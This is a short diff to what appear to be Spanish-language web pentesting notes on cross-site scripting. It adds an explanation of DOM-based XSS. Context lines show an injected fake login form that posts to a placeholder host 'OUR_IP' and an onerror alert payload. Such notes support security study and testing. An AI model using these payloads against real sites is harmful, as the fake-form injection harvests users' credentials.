@@ -39,6 +39,8 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 
 ####################### DOM XSS
+Las dom based no hacen transacciones con el back-end, quedan enteramente del lado del cliente. Una buena forma de probarlas es ver si un input que se muestra en la pantalla
+no genera una request.
 ##### armado de payloads:
 stored DOM xss:
 <><img src=1 onerror=alert(1)>
